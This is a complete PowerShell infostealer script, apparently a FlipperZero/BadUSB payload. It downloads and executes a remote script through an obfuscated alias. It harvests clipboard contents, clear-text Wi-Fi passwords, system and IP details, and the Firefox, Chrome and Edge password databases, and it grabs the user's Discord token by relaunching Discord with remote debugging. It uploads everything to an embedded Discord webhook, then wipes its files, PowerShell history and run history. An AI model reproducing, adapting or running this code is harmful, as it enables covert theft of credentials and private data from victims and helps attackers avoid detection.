# Define function aliases and URL placeholders
$n='i'; set-alias v $n'wr';
$b=[char]116; $c=[char]47;
$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);
$scriptUrl = $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ';

# Function to notify user of the script's activity
function Show-Notification {
    param (
        [string]$Message,
        [string]$Title = 'Script Notification'
    )
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($Message, $Title)
}

# Download and execute remote script
try {
    $remoteScript = v -usebasicparsing $scriptUrl;
    Write-Host "Successfully downloaded script from $scriptUrl" -ForegroundColor Green;
    Invoke-Expression $remoteScript;
    Show-Notification -Message "Script executed successfully." -Title "Script Notification"
} catch {
    Write-Error "Error downloading or executing script: $($_.Exception.Message)";
    Show-Notification -Message "Error: $($_.Exception.Message)" -Title "Script Notification"
    exit;
}

# Adjust webhook URL to your specific endpoint
$webhookUrl = "https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo";

# Check for network availability before proceeding
if (-not (Test-Connection -ComputerName google.com -Count 1 -Quiet)) {
    Write-Error "Network connection is not available.";
    Show-Notification -Message "Network connection is not available. Exiting script." -Title "Network Error"
    exit;
}

# Generate PC details (ComputerName, UserName, Timestamp)
$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S";

# Prepare output logs
$statFile = "$env:temp\stats-$namepc.txt";
Out-File -InputObject "#### PC Stats and Info ####" -FilePath $statFile;

# Capture clipboard contents
Out-File -InputObject "#### PC Clipboard ####" -Append -FilePath $statFile;
(Get-Clipboard) | Out-File -Append -FilePath $statFile;

# Capture WiFi passwords
$wifiFile = "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name=$_.Matches.Groups[1].Value.Trim();
    netsh wlan show profile name="$name" key=clear
} | Out-File $wifiFile;

# Take screenshot
cd "$env:temp";
$screenshotScript = @"
function Get-ScreenCapture {
    Add-Type -AssemblyName System.Drawing, System.Windows.Forms;
    \$bitmap = [Windows.Forms.Clipboard]::GetImage();
    \$bitmap.Save(\"`$env:temp\$env:UserName-Capture.jpg\");
}
"@
Out-File -FilePath "$env:temp\screenshot.ps1" -InputObject $screenshotScript;
powershell -ExecutionPolicy Bypass -File "$env:temp\screenshot.ps1";

# Kill Discord and restart with remote debugging to grab the token
taskkill /IM Discord.exe /F;
gci $env:appdata\..\local\Discord\app-* | ? { $_.PSIsContainer } | sort CreationTime -desc | select -First 1 | cd;
.\Discord.exe --remote-debugging-port=9222;

# Log environment variables and IP info
Get-ChildItem env: | Out-File -Append -FilePath $statFile;
$pubip = (Invoke-WebRequest -UseBasicParsing -Uri "http://ifconfig.me/").Content;
Out-File -InputObject "PUBLIC IP: $pubip" -Append -FilePath $statFile;
ipconfig /all | Out-File -Append -FilePath $statFile;

# Collect installed software information
Out-File -InputObject "#### Installed Software ####" -Append -FilePath $statFile;
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -AutoSize | Out-File -Append -FilePath $statFile;

Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -AutoSize | Out-File -Append -FilePath $statFile;

# Collect browser data (Firefox, Chrome, Edge)
$firefoxData = "$env:appdata\Mozilla\Firefox\Profiles";
$chromeData = "$env:appdata\..\local\Google\Chrome\User Data";
$edgeData = "$env:appdata\..\Local\Microsoft\Edge\User Data";

$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip";
$chromepassword = "$env:temp\Chrome-Password-$namepc.zip";
$edgepassword = "$env:temp\Edge-Password-$namepc.zip";

Compress-Archive -Path "$firefoxData\key4.db", "$firefoxData\logins.json" -DestinationPath $firefoxpassword -Force;
Compress-Archive -Path "$chromeData\Local State", "$chromeData\default\Login Data", "$chromeData\default\Preferences" -DestinationPath $chromepassword -Force;
Compress-Archive -Path "$edgeData\Local State", "$edgeData\default\Login Data", "$edgeData\default\Preferences" -DestinationPath $edgepassword -Force;

# Backup and reset Edge folder to simulate fresh behavior
taskkill /IM msedge.exe /F;
Move-Item -Path "$env:appdata\..\Local\Microsoft\Edge" -Destination "$env:appdata\..\Local\Microsoft\ZZZZZZZ";

# Pause for interactions (e.g., FlipperZero)
Start-Sleep -Seconds 60;

# Retrieve Discord token from clipboard
$token = Get-Clipboard;
Out-File -InputObject "#### Discord Token ####" -Append -FilePath $statFile;
Out-File -InputObject $token -Append -FilePath $statFile;

# Capture token as image
powershell -ExecutionPolicy Bypass -File "$env:temp\screenshot.ps1";

# Prepare and send data to webhook
$Body = @{
    content = "**PC Stats from** $env:UserName on $env:computername"
};
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json);

# Upload files to Discord webhook
$filesToUpload = @($statFile, $wifiFile, $firefoxpassword, $chromepassword, $edgepassword, "$env:temp\$env:UserName-Capture.jpg");
foreach ($file in $filesToUpload) {
    curl.exe -F "file=@$file" $webhookUrl;
}

# Clean up traces and restore configurations
taskkill /IM Discord.exe /F;
Remove-Item -Path $statFile, $wifiFile, $firefoxpassword, $chromepassword, $edgepassword -Force;
Remove-Item -Path "$env:temp\*.ps1" -Force;
Move-Item -Path "$env:appdata\..\Local\Microsoft\ZZZZZZZ" -Destination "$env:appdata\..\Local\Microsoft\Edge";

# Clear PowerShell history and run history from registry
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force;

# Notify user and exit script
Show-Notification -Message "Script completed successfully." -Title "Script Notification"
exit;
